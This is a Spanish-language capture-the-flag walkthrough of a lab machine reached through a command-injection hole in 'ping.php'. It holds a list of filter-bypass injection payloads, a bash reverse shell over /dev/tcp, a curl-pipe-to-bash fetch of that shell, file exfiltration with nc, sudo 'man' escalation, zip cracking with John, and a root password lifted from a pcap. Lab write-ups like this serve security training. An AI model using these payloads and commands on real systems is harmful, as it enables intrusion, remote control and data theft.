## Reconocimiento:

Puerto 80 : HTTP 

En la web hay un archivo llamado “ping.php” que espera una IP para mandar paquetes pero si concateno una IP no sale nada. 

Le hago fuzzing para averiguar el parámetro que necesita:

```bash
ffuf -u 'http://172.17.0.2/ping.php?FUZZ=/etc/passwd' -w ~/dirb/big.txt -fs 34
```

Encuentro el parámetro “ip”.

Con ese el archivo ya devuelve información:

```bash
http://172.17.0.2/ping.php?ip=172.17.0.1
```

Intentando concatenar comandos con varios caracteres no funciona, así que me copio un diccionario de posibles opciones validas encodeadas en URL.

Diccionario:

```
/usr/bin/p?ng
nma? -p 80 localhost
/usr/bin/who*mi
touch -- -la
ls
/usr/bin/n[c]
'p'i'n'g
"w"h"o"a"m"i
\u\n\a\m\e \-\a
ech''o test
ech""o test
bas''e64
/\b\i\n/////s\h
echo whoami|$0
cat$u /etc$u/passwd$u
p${u}i${u}n${u}g
p$(u)i$(u)n$(u)g
w`u`h`u`o`u`a`u`m`u`i
!-1
mi
whoa
!-1!-2
{cat,lol.txt}
{echo,test}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b
IFS=,;`cat<<<cat,/etc/passwd`
echo${IFS}test
X=$'cat\x20/etc/passwd'&&$X
p\
i\
n\
g
$u $u
uname!-1\-a
```

```bash
ffuf -u "http://172.17.0.2/ping.php?ip=172.17.0.1;FUZZ" -w bypasses.txt --enc 'FUZZ:urlencode' -fs 21
```

Encuentro una línea valida:

```bash
%5Cu%5Cn%5Ca%5Cm%5Ce+%5C-%5Ca
# En la URL:
http://172.17.0.2/ping.php?ip=172.17.0.1;%5Cu%5Cn%5Ca%5Cm%5Ce+%5C-%5Ca
```

Se ejecuta de forma correcta. 

Probando la misma mecánica para leer el archivo passwd funciona:

```bash
http://172.17.0.2/ping.php?ip=172.17.0.1;\c\a\t+/e\t\c/p\a\s\s\w\d
```

Ahora toca hacernos de una conexión al servidor con una shell.

shell.sh:

```bash
#!/bin/bash

bash -i >& /dev/tcp/172.17.0.1/4444 0>&1
```

En el directorio donde esta el archivo abro un servidor con Python para agarrarla con curl:

```bash
python3 -m http.server 80
```

Me pongo a la escucha:

```bash
nc -lvnp 4444
```

En la URL:

```bash
http://172.17.0.2/ping.php?ip=172.17.0.1;\c\u\r\l+ -\s+ h\t\t\p://1\7\2.1\7\.0.1\/s\h\e\l\l.sh+|\b\a\s\h
```

## Escalada www-data → balutin

```bash
sudo -l
(balutin) NOPASSWD: /usr/bin/man
```

Gracias Gtfo bins:

```bash
sudo -u balutin man man
!/bin/bash
```

## Escalada balutin → root

En el directorio /home hay un archivo .zip interesante que requiere contraseña, lo pasamos a la maquina host. 

No hay Python, así que uso nc:

Desde el host:

```bash
nc -lvnp 7777 > secretito.zip
```

Desde la víctima:

```bash
cat ~/secretito.zip > /dev/tcp/172.17.0.1/7777
```

Utilizo John para descriptarlo:

```bash
zip2john secretito.zip > hash.zip
john --wordlist=/usr/share/wordlists/rockyou.txt hash.zip
```

Pass : chocolate

Dentro hay un archivo .pcap que es una captura de trafico de red, si la intento abrir con wireshark no deja. pero solo leyéndola con “strings” se puede ver algo:

```bash
strings traffic.pcap
# Info:
username=root&password=secretitosecretazo!
```

Es la contraseña de root.

Listo.
